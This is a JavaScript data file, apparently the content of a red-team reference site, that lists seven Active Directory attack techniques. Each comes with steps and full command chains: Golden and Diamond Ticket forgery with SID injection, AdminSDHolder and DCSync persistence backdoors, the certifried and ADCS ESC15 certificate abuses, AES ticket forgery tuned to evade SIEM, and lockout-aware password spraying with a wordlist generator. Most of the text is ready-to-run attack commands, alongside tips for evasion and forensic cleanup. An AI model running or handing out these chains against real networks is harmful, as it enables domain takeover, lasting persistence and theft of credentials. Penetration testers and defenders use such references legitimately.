export const adDeepTechniques = [
  {
    id: 'ad-sid-history-injection',
    title: 'SID History Injection — Golden Ticket with Forest Escalation',
    subtitle: 'Inject arbitrary SIDs into Kerberos tickets via mimikatz misc::addsid to grant cross-forest and cross-domain admin rights',
    tags: ['SID history', 'Golden Ticket', 'Enterprise Admin', 'mimikatz addsid', 'msDS-SIDHistory', 'PAC injection', 'cross-forest', 'inter-realm'],
    accentColor: 'cyan',
    overview: 'The SID history attribute (msDS-SIDHistory) allows migrated accounts to retain access rights from their original domain. Kerberos includes the SID history in the PAC (Privilege Attribute Certificate) of tickets — the DC uses these SIDs for access control decisions. With control of the krbtgt hash, an attacker can inject ANY SID into the SID history of a Golden Ticket, including the Enterprise Admins SID of the root domain (S-1-5-21-ROOT-519), granting forest-wide Domain Admin equivalent access. This bypasses the parent/child domain boundary entirely.',
    steps: [
      'Obtain the child domain krbtgt NTLM hash via DCSync: mimikatz lsadump::dcsync /domain:child.corp.local /user:krbtgt',
      'Obtain the root domain SID: Get-DomainSID -Domain corp.local',
      'Forge Golden Ticket with SID History: mimikatz kerberos::golden with /sids: parameter pointing to root domain Enterprise Admins (RID 519)',
      'Pass-the-Ticket: inject the forged ticket into the current session with mimikatz kerberos::ptt',
      'Access root domain resources: ls \\\\root-dc.corp.local\\C$ should succeed — you have EA rights',
      'DCSync on root domain: mimikatz lsadump::dcsync /domain:corp.local /user:Administrator',
      'Cleanup: purge tickets with klist purge after exploitation to reduce forensic footprint',
    ],
    commands: [
      {
        title: 'Full Golden Ticket with SID history injection',
        code: `# Step 1: Get child domain krbtgt hash
mimikatz lsadump::dcsync /domain:child.corp.local /user:krbtgt /dc:child-dc.child.corp.local

# Step 2: Get domain SIDs
# Child domain SID (where we are):
Get-DomainSID -Domain child.corp.local
# Root domain SID (where we want to be):
Get-DomainSID -Domain corp.local

# Step 3: Forge Golden Ticket with multiple SIDs
# /sids: Enterprise Admins = S-1-5-21-<ROOT-SID>-519
# /sids: Domain Admins of root = S-1-5-21-<ROOT-SID>-512
mimikatz kerberos::golden \\
  /user:Administrator \\
  /domain:child.corp.local \\
  /sid:S-1-5-21-CHILD-DOMAIN-SID \\
  /krbtgt:CHILD-KRBTGT-NTLM-HASH \\
  /sids:S-1-5-21-ROOT-DOMAIN-SID-519,S-1-5-21-ROOT-DOMAIN-SID-512 \\
  /ptt

# Verify: check klist
klist

# Access root domain DC
ls \\\\rootdc.corp.local\\C$
ls \\\\rootdc.corp.local\\ADMIN$

# DCSync root domain using the forged ticket
mimikatz lsadump::dcsync /domain:corp.local /user:krbtgt /dc:rootdc.corp.local
mimikatz lsadump::dcsync /domain:corp.local /all /csv /dc:rootdc.corp.local

# Rubeus version (modern alternative)
execute-assembly /tools/Rubeus.exe golden \\
  /user:Administrator \\
  /domain:child.corp.local \\
  /sid:S-1-5-21-CHILD-SID \\
  /rc4:CHILD-KRBTGT-HASH \\
  /sids:S-1-5-21-ROOT-SID-519 \\
  /ptt /nowrap

# impacket version (from Linux)
impacket-ticketer -nthash CHILD-KRBTGT-HASH \\
  -domain-sid S-1-5-21-CHILD-SID \\
  -domain child.corp.local \\
  -extra-sid S-1-5-21-ROOT-SID-519 \\
  Administrator
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass rootdc.corp.local -just-dc`
      }
    ]
  },

  {
    id: 'ad-diamond-ticket',
    title: 'Diamond Ticket — Stealthier Golden Ticket Alternative',
    subtitle: 'Forge Kerberos tickets by modifying existing legitimate TGTs in-memory rather than creating from scratch — bypasses PAC validation anomaly detection',
    tags: ['Diamond Ticket', 'PAC modification', 'TGT forge', 'Rubeus diamond', 'stealthy ticket', 'PAC validation', 'Kerberos anomaly detection'],
    accentColor: 'cyan',
    overview: 'Classic Golden Tickets are forged from scratch and signed with the krbtgt hash. Modern detection focuses on PAC anomalies — tickets signed with the wrong key or with unusual field values. The Diamond Ticket technique modifies a legitimate, KDC-issued TGT by decrypting it with the krbtgt hash, altering the PAC (adding group memberships, changing privileges), re-encrypting, and using the modified ticket. Since the ticket originated from the KDC, it passes PAC validation checks that Golden Tickets fail.',
    steps: [
      'Request a legitimate TGT for a domain user (even a low-privilege one)',
      'Decrypt the TGT using the krbtgt AES256 key: Rubeus diamond /tgtdeleg or /ticket:<base64>',
      'Modify the PAC in-memory: add Domain Admins group SID (512), Enterprise Admins (519), inject extra SIDs',
      'Re-encrypt with krbtgt key — the ticket is still validly signed, just with modified authorisation data',
      'The result passes PAC re-validation checks that detect classic Golden Tickets',
      'Harder to detect because the ticket was legitimately issued by the KDC — only the PAC content is modified',
      'Requires krbtgt AES256 key (not just RC4) for full stealth — use /aes256 in Rubeus',
    ],
    commands: [
      {
        title: 'Diamond Ticket with Rubeus',
        code: `# Diamond Ticket — modify legitimate TGT PAC in-memory
# Requires: krbtgt AES256 key (obtain via DCSync)

# Step 1: Get krbtgt AES256 key via DCSync
mimikatz lsadump::dcsync /domain:corp.local /user:krbtgt
# Note: aes256_hmac value

# Step 2: Create Diamond Ticket (Rubeus modifies a real TGT)
# Method 1: using current user's TGT delegation
execute-assembly /tools/Rubeus.exe diamond \\
  /domain:corp.local \\
  /user:lowprivuser \\
  /password:Password \\
  /enctype:aes256 \\
  /krbkey:AES256-KRBTGT-KEY \\
  /ticketuser:Administrator \\
  /ticketuserid:500 \\
  /groups:512,519 \\
  /ptt /nowrap

# Method 2: Modify existing ticket (/ticket: parameter)
execute-assembly /tools/Rubeus.exe diamond \\
  /ticket:BASE64-TGT-FROM-MONITOR \\
  /enctype:aes256 \\
  /krbkey:AES256-KRBTGT-KEY \\
  /groups:512,519 \\
  /sids:S-1-5-21-ROOT-SID-519 \\
  /ptt /nowrap

# Verify
execute-assembly /tools/Rubeus.exe klist
ls \\\\DC01.corp.local\\C$

# impacket diamond ticket
python3 ticketer.py -aesKey AES256-KRBTGT-KEY \\
  -domain-sid S-1-5-21-DOMAIN-SID \\
  -domain corp.local \\
  -groups 512,519 \\
  -user-id 500 \\
  Administrator
export KRB5CCNAME=Administrator.ccache
impacket-smbclient -k -no-pass //DC01.corp.local/C$`
      }
    ]
  },

  {
    id: 'ad-dacl-persistence',
    title: 'DACL-Based Persistence — AdminSDHolder & DCSync Backdoor',
    subtitle: 'Establish persistent domain admin access via AdminSDHolder modification and hidden DCSync rights that survive password resets',
    tags: ['AdminSDHolder', 'SDProp', 'DCSync backdoor', 'WriteDACL persistence', 'DS-Replication', 'BloodHound persistence', 'hidden backdoor'],
    accentColor: 'cyan',
    overview: 'AdminSDHolder is a special AD object in CN=AdminSDHolder,CN=System,DC=... that serves as a security descriptor template for all privileged accounts and groups. Every 60 minutes (SDProp), the Security Descriptor Propagator copies the AdminSDHolder DACL onto all protected objects — this OVERWRITES any custom ACL you set on DA/EA/BA accounts. But the inverse is powerful for persistence: if you write a backdoor ACE to AdminSDHolder itself, it propagates to ALL protected accounts after 60 minutes and survives direct cleanup attempts on individual accounts.',
    steps: [
      'Write backdoor ACE to AdminSDHolder: gives your account GenericAll on ALL DA/EA/BA accounts after SDProp runs (max 60 minutes)',
      'DCSync backdoor: grant DS-Replication-Get-Changes and DS-Replication-Get-Changes-All on the domain root — survives krbtgt rotation',
      'WriteDACL on domain root: even more persistent — lets you re-grant yourself any right at any time',
      'After SDProp runs: check that your account now has GenericAll on Domain Admins group and all DA accounts',
      'If you get caught and lose DA: wait for SDProp or trigger it manually, then use the backdoor GenericAll to re-add yourself',
      'Cleanup detection: the backdoor in AdminSDHolder is not obvious — requires auditing the AdminSDHolder DACL specifically, not just domain object DACLs',
    ],
    commands: [
      {
        title: 'AdminSDHolder backdoor and DCSync persistence',
        code: `# === AdminSDHolder Backdoor ===
# Write GenericAll on AdminSDHolder — propagates to ALL protected accounts in <60 min
Add-DomainObjectAcl \\
  -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \\
  -PrincipalIdentity attacker \\
  -Rights All \\
  -Verbose
# Wait up to 60 min for SDProp, or trigger manually:
# $thread = [System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices")
# Use LDAP to write schemaUpdateNow equivalent

# Verify backdoor propagated (after SDProp)
Get-ObjectAcl -Identity "Domain Admins" -ResolveGUIDs |
  Where-Object {$_.SecurityIdentifier -match "attacker-SID"}

# === DCSync Backdoor ===
# Grant yourself DCSync rights directly on the domain root
# These rights survive all password resets and krbtgt rotations
Add-DomainObjectAcl \\
  -TargetIdentity "DC=corp,DC=local" \\
  -PrincipalIdentity attacker \\
  -Rights DCSync \\
  -Verbose
# or via bloodyad:
bloodyad -d corp.local -u admin -p Pass --host DC01 \\
  grant user attacker "DC=corp,DC=local" DCSync

# Verify DCSync rights granted
Get-ObjectAcl -DistinguishedName "DC=corp,DC=local" -ResolveGUIDs |
  Where-Object {$_.ActiveDirectoryRights -match "ExtendedRight" -and
    $_.SecurityIdentifier -match "attacker-SID"}

# Use DCSync backdoor later (even after you've been kicked out)
mimikatz lsadump::dcsync /domain:corp.local /user:krbtgt /user:Administrator

# impacket DCSync (from Linux)
impacket-secretsdump corp.local/attacker:Password@DC01 -just-dc

# === BloodHound query to find hidden DCSync principals ===
MATCH (n)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain) 
RETURN n.name, labels(n)

# Detect AdminSDHolder backdoor (defenders):
# Enumerate AdminSDHolder DACL:
Get-ObjectAcl -Identity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" -ResolveGUIDs |
  Where-Object {$_.IdentityReference -notmatch "Domain Admins|Enterprise Admins|SYSTEM|Administrators"}
# Unexpected ACEs here = backdoor`
      }
    ]
  },

  {
    id: 'ad-certifried',
    title: 'certifried — Machine Account Certificate Abuse (CVE-2022-26923)',
    subtitle: 'Exploit the ability to set dNSHostName on machine accounts to obtain a domain controller certificate and perform DCSync',
    tags: ['certifried', 'CVE-2022-26923', 'dNSHostName', 'machine account', 'ADCS', 'DC certificate', 'PKINIT', 'UnPAC-the-Hash'],
    accentColor: 'cyan',
    overview: 'CVE-2022-26923 (certifried) exploits a flaw in how ADCS maps certificate subjects to AD accounts. Any domain user can create a machine account and set its dNSHostName to match a domain controller. When a certificate is requested for this machine account using the default Machine or DomainController template, the CA issues a certificate with the DC\'s hostname in the Subject Alternative Name. This certificate can then be used with PKINIT to obtain a TGT as the domain controller, enabling DCSync. Requires default ADCS configuration — patched by May 2022 CU.',
    steps: [
      'Check if vulnerable: ADCS is present and default Machine/Computer template allows enrollment',
      'Create a machine account: impacket-addcomputer or Powermad — need MachineAccountQuota > 0',
      'Set dNSHostName of the machine account to match a DC: ATTACKER.corp.local → DC01.corp.local',
      'Clear the servicePrincipalName values that conflict (HOST/ATTACKER.corp.local)',
      'Request certificate using the machine account: certipy req targeting the Machine or Computer template',
      'ADCS issues a certificate with DC01.corp.local in the SAN',
      'Use PKINIT with the certificate to get a TGT as DC01$ → UnPAC-the-Hash → DCSync',
    ],
    commands: [
      {
        title: 'certifried full exploit chain',
        code: `# Check ADCS is present and get CA info
certipy find -u user@corp.local -p Password -dc-ip DC01

# Step 1: Create machine account
impacket-addcomputer corp.local/user:Password \\
  -computer-name ATTACKER \\
  -computer-pass 'Pass123!' \\
  -dc-ip DC01

# Step 2: Set dNSHostName to match DC (certipy)
# Direct LDAP modification via certipy or bloodyad
bloodyad -d corp.local -u user -p Password --host DC01 \\
  set object "ATTACKER$" dNSHostName DC01.corp.local

# Step 3: Remove conflicting SPNs (they reference the old hostname)
bloodyad -d corp.local -u user -p Password --host DC01 \\
  remove object "ATTACKER$" servicePrincipalName "HOST/ATTACKER.corp.local"
bloodyad -d corp.local -u user -p Password --host DC01 \\
  remove object "ATTACKER$" servicePrincipalName "RestrictedKrbHost/ATTACKER"
# Or via LDAP directly:
# Clear all SPNs: Set-ADComputer ATTACKER -ServicePrincipalNames @{}

# Step 4: Request certificate as ATTACKER$ targeting Machine template
certipy req \\
  -u ATTACKER$@corp.local \\
  -p 'Pass123!' \\
  -ca CORP-CA \\
  -template Machine \\
  -dc-ip DC01
# Certipy output: attacker.pfx (certificate with SAN DC01.corp.local)

# Step 5: Authenticate as DC01$ via PKINIT
certipy auth -pfx attacker.pfx -dc-ip DC01
# Output: DC01$.ccache + NT hash for DC01$ (machine account)

# Step 6: DCSync using DC01$ credentials
export KRB5CCNAME=DC01$.ccache
impacket-secretsdump -k -no-pass DC01.corp.local -just-dc
# Or using machine account NT hash:
impacket-secretsdump -hashes :MACHINE-NTLM-HASH 'corp.local/DC01$@DC01.corp.local' -just-dc

# Rubeus PKINIT (Windows/beacon)
execute-assembly /tools/Rubeus.exe asktgt \\
  /user:DC01$ \\
  /certificate:attacker.pfx \\
  /getcredentials /ptt /nowrap
# /getcredentials = UnPAC-the-Hash → extracts DC01$ NT hash`
      }
    ]
  },

  {
    id: 'ad-esc15-ekuwild',
    title: 'ADCS ESC15 — EKU Override via issuance Policy OID and v1 Template Abuse',
    subtitle: 'Exploit EKU validation gaps in v1 certificate templates to enroll client auth certs with any EKU including code signing',
    tags: ['ADCS', 'ESC15', 'EKU override', 'v1 template', 'issuance policy', 'Any Purpose', 'code signing cert', 'PKINIT', 'certipy'],
    accentColor: 'cyan',
    overview: 'ESC15 (identified post-SpectreOps research, 2024) exploits the fact that v1 certificate templates do not enforce EKU constraints from the template definition when an Enrollment Agent or a CA with EDITF_ATTRIBUTESUBJECTALTNAME2 is involved. By enrolling using a v1 template with Any Purpose EKU and then submitting a policy OID that maps to an unrestricted issuance policy, an attacker can obtain certificates with arbitrary EKU values — including Client Authentication for PKINIT, Code Signing for executable trust, or Smart Card Logon for physical access badge abuse.',
    steps: [
      'Identify v1 templates with low enrollment permissions and Any Purpose or no EKU restriction',
      'Check if the CA has EDITF_ATTRIBUTESUBJECTALTNAME2 enabled — allows EKU injection via CSR attributes',
      'Craft a CSR with custom EKU OIDs in the certificate request extension attributes',
      'Submit to CA: if v1 template or EDITF_ATTRIBUTESUBJECTALTNAME2 is set, EKU may be accepted from CSR',
      'Resulting cert has attacker-specified EKU — use for Client Auth (PKINIT), Code Signing, or Smart Card Logon',
      'Enumerate via certipy: look for templates with msPKI-Certificate-Application-Policy = Any Purpose (2.5.29.37.0)',
      'Combine with ESC6 (EDITF flag) for broadest EKU injection surface',
    ],
    commands: [
      {
        title: 'ESC15 / EKU override via CSR attribute injection',
        code: `# Enumerate templates vulnerable to EKU override
certipy find -u user@corp.local -p Password -dc-ip DC01 -vulnerable -stdout 2>&1 | \\
  grep -A10 "Any Purpose\\|ESC15\\|EDITF_ATTRIBUTESUBJECTALTNAME"

# Check CA flags (EDITF_ATTRIBUTESUBJECTALTNAME2 = flag value 0x40)
certutil -config "CA.corp.local\\CORP-CA" -getreg policy\\EditFlags
# If value includes 0x00040000 (262144) = EDITF_ATTRIBUTESUBJECTALTNAME2 set

# Craft CSR with custom EKU via openssl
# Create CSR config with custom EKU OIDs
cat > csr.conf << 'EOF'
[req]
default_bits = 2048
prompt = no
distinguished_name = req_distinguished_name
req_extensions = v3_req

[req_distinguished_name]
CN = attacker

[v3_req]
subjectAltName = otherName:1.3.6.1.4.1.311.20.2.3;UTF8:attacker@corp.local
extendedKeyUsage = clientAuth, codeSigning, 1.3.6.1.4.1.311.20.2.2
EOF

openssl req -new -newkey rsa:2048 -nodes -keyout attacker.key -out attacker.csr -config csr.conf

# Submit CSR to CA (manual enrollment)
certipy req \\
  -u user@corp.local -p Password \\
  -ca CORP-CA \\
  -template "VulnerableV1Template" \\
  -csr attacker.csr \\
  -dc-ip DC01

# Or certipy with EKU override via -application-policies flag (certipy 4.8+)
certipy req \\
  -u user@corp.local -p Password \\
  -ca CORP-CA \\
  -template "User" \\
  -upn Administrator@corp.local \\
  -application-policies "Client Authentication,Code Signing" \\
  -dc-ip DC01

# Use code-signing cert for executable trust bypass
# Sign payload with code-signing cert obtained via ADCS
osslsigncode sign \\
  -certs attacker.pfx \\
  -pkcs12 attacker.pfx \\
  -pass "" \\
  -in payload.exe \\
  -out payload_signed.exe
# Signed by a domain CA — may bypass application whitelisting`
      }
    ]
  },

  {
    id: 'ad-kerberos-delegation-opsec',
    title: 'Kerberos Ticket Forgery — AES Encryption & OPSEC-Safe Ticket Manipulation',
    subtitle: 'Forge Kerberos tickets using AES256 instead of RC4 to evade detection systems that flag RC4 downgrade anomalies',
    tags: ['Kerberos OPSEC', 'AES256 ticket', 'RC4 downgrade detection', 'Rubeus opsec', 'Diamond Ticket', 'no RC4', 'ettype 18', 'SIEM evasion'],
    accentColor: 'yellow',
    overview: 'Most SOC detections for Kerberos ticket abuse focus on RC4 (etype 23) usage — RC4 is considered legacy and its presence in TGT requests or ticket forgeries is a high-fidelity indicator. Using AES256 (etype 18) for all Kerberos operations reduces detection probability significantly. This requires obtaining the AES256 key (via DCSync or Rubeus dump) rather than the NTLM hash, and using the /opsec flag in Rubeus to request AES256 tickets through the standard KDC channel rather than forging them offline.',
    steps: [
      'Obtain AES256 keys via DCSync: mimikatz lsadump::dcsync with /user:krbtgt — look for aes256_hmac value',
      'Request tickets using AES256: Rubeus asktgt /enctype:aes256 /aes256:<key> — KDC-issued, not forged',
      'Avoid RC4 downgrade: never use /rc4 flag in Rubeus unless specifically needed for older DCs',
      'Use /opsec flag in Rubeus: requests renewableok, canonicalize — looks like a legitimate ticket',
      'For Golden Ticket: use /aes256 krbtgt key — harder to detect than /rc4',
      'Request tickets from the KDC (Diamond Ticket approach) rather than forge offline when possible',
      'Monitor etype in event 4769: etypes 23 (RC4) in a domain using AES = high confidence anomaly; etypes 17/18 (AES) blend in',
    ],
    commands: [
      {
        title: 'OPSEC-safe Kerberos operations — AES256 throughout',
        code: `# === Get AES256 keys via DCSync ===
mimikatz lsadump::dcsync /domain:corp.local /user:krbtgt
# Look for: aes256_hmac value

# Get target service account AES keys
mimikatz lsadump::dcsync /domain:corp.local /user:svc-sql
mimikatz lsadump::dcsync /domain:corp.local /user:Administrator

# === OPSEC-Safe TGT Request (AES256) ===
# Use AES256 key — not NTLM hash
execute-assembly /tools/Rubeus.exe asktgt \\
  /user:svc-sql \\
  /aes256:AES256-KEY-HERE \\
  /domain:corp.local \\
  /opsec \\             # Adds renewableok, canonicalize, forwardable flags
  /createnetonly:C:\\Windows\\System32\\cmd.exe \\  # Create sacrificial process
  /show \\nowrap

# === OPSEC-Safe Kerberoasting (Request AES tickets only) ===
# /rc4opsec: only roast accounts whose tickets can be RC4 downgraded
# /aes256: request AES256 TGS (harder to crack but OPSEC safe)
execute-assembly /tools/Rubeus.exe kerberoast \\
  /nowrap \\
  /aes256     # Request AES256 TGS — shows as etype 18 in logs (less suspicious)

# === OPSEC-Safe Golden Ticket (AES256) ===
# Use AES256 krbtgt key — not RC4
mimikatz kerberos::golden \\
  /user:Administrator \\
  /domain:corp.local \\
  /sid:S-1-5-21-DOMAIN-SID \\
  /aes256:AES256-KRBTGT-KEY \\    # NOT /rc4 — AES256 less detectable
  /id:500 \\
  /groups:512,519,544 \\
  /ptt

# Rubeus Golden with AES
execute-assembly /tools/Rubeus.exe golden \\
  /user:Administrator \\
  /domain:corp.local \\
  /sid:S-1-5-21-DOMAIN-SID \\
  /aes256:AES256-KRBTGT-KEY \\
  /enctype:aes256 \\
  /ptt /nowrap

# === Verify ticket etype (should show 18 = AES256, not 23 = RC4) ===
execute-assembly /tools/Rubeus.exe klist
# Look for: Etype: aes256-cts-hmac-sha1-96 (18) — not rc4-hmac (23)

# === SIEM detection note ===
# Event ID 4769: check TicketEncryptionType
# 0x17 (23) = RC4  → HIGH RISK indicator in modern domains
# 0x12 (18) = AES256 → normal in modern domains
# 0x11 (17) = AES128 → less common but less suspicious than RC4`
      }
    ]
  },

  {
    id: 'ad-msdsusr-spray',
    title: 'msDS-PasswordExpiryTimeComputed Spray — Low-Noise Password Inference',
    subtitle: 'Infer recently changed passwords by correlating msDS-PasswordExpiryTimeComputed with password policy to target time-predictable accounts',
    tags: ['password spray', 'password expiry', 'msDS-PasswordExpiryTimeComputed', 'temporal targeting', 'low-noise spray', 'password policy', 'account lifecycle'],
    accentColor: 'yellow',
    overview: 'Traditional password spraying sends one password to all accounts — noisy. This technique uses LDAP to read msDS-PasswordExpiryTimeComputed (the calculated expiry time based on the last password set date and the policy MaxPasswordAge). Accounts whose passwords are about to expire are prime targets because users often pick seasonal, incremental, or predictable passwords when forced to change. Similarly, newly created accounts often have a default or temporary password pattern. By correlating expiry times with the organisation\'s password policy, an attacker can identify accounts that changed their password in the last N days and target them with temporally-relevant wordlists.',
    steps: [
      'Read msDS-PasswordExpiryTimeComputed and pwdLastSet for all users via LDAP (any authenticated user can read these)',
      'Calculate when each user last changed their password: pwdLastSet = Windows FILETIME (100ns intervals since 1601)',
      'Cross-reference with password policy MaxPasswordAge to identify accounts that were recently forced to change',
      'Build targeted wordlists: Month+Year (April2024!), seasonal variations, company name + year, role-based terms',
      'Target accounts with recent (1-7 day old) password changes — highest probability of weak/predictable passwords',
      'Spray at 1-2 attempts per account to stay under lockout threshold — use Bad-Pwd-Count from LDAP to monitor threshold',
      'Target service accounts with never-expiring passwords separately — these are often ancient and easy to crack',
    ],
    commands: [
      {
        title: 'Temporal password spray — targeting recently changed accounts',
        code: `# === Enumerate password expiry timing via LDAP ===

# PowerView — get all users with password age info
Get-DomainUser -Properties samaccountname,pwdlastset,badpwdcount,passwordexpired,useraccountcontrol |
  Select-Object samaccountname, 
    @{n='PwdLastSet';e={[datetime]::FromFileTime($_.pwdlastset)}},
    @{n='DaysSinceChange';e={((Get-Date) - [datetime]::FromFileTime($_.pwdlastset)).Days}},
    badpwdcount, passwordexpired |
  Sort-Object DaysSinceChange

# Identify accounts that changed password in the last 7 days (freshly changed = predictable)
Get-DomainUser -Properties samaccountname,pwdlastset |
  Where-Object { 
    $_.pwdlastset -gt 0 -and 
    ((Get-Date) - [datetime]::FromFileTime($_.pwdlastset)).TotalDays -lt 7 
  } | Select-Object samaccountname

# Save fresh-change targets to file
Get-DomainUser -Properties samaccountname,pwdlastset |
  Where-Object { 
    $_.pwdlastset -gt 0 -and 
    ((Get-Date) - [datetime]::FromFileTime($_.pwdlastset)).TotalDays -lt 7 
  } | Select-Object -ExpandProperty samaccountname | Out-File fresh_targets.txt

# impacket version (from Linux)
impacket-GetADUsers corp.local/user:Password -dc-ip DC01 -all 2>/dev/null |
  awk '{print $1, $5}' | sort -k2 -r | head -20

# netexec LDAP — get password policy
nxc ldap DC01 -u user -p Password -d corp.local --pass-pol

# === Build temporal wordlist ===
python3 << 'EOF'
import datetime
months = ["January","February","March","April","May","June",
          "July","August","September","October","November","December"]
years = [2023, 2024, 2025]
company = "Corp"

words = []
for y in years:
    for m in months:
        words += [
            f"{m}{y}!",     f"{m[:3]}{y}!",
            f"{company}{m}{y}!",  f"{m}{y}@1",
            f"Spring{y}!" if m in ["March","April","May"] else None,
            f"Summer{y}!" if m in ["June","July","August"] else None,
            f"Fall{y}!"   if m in ["September","October","November"] else None,
            f"Winter{y}!" if m in ["December","January","February"] else None,
        ]
wordlist = [w for w in words if w]
with open("temporal_wordlist.txt", "w") as f:
    f.write("\\n".join(wordlist))
print(f"Generated {len(wordlist)} temporal passwords")
EOF

# === Low-noise spray (1 attempt per account per run) ===
# kerbrute — Kerberos pre-auth spray (doesn't log to Event Log 4625)
# Lower noise than LDAP/SMB spray
kerbrute passwordspray -d corp.local fresh_targets.txt 'April2025!' \\
  --dc DC01 -o spray_results.txt

# netexec spray
nxc smb DC01 -d corp.local -u fresh_targets.txt -p temporal_wordlist.txt \\
  --no-bruteforce --continue-on-success

# Monitor lockout thresholds in real time
Get-DomainUser -Properties samaccountname,badpwdcount |
  Where-Object {$_.badpwdcount -gt 0} |
  Select-Object samaccountname, badpwdcount | Sort-Object badpwdcount -Descending`
      }
    ]
  },
];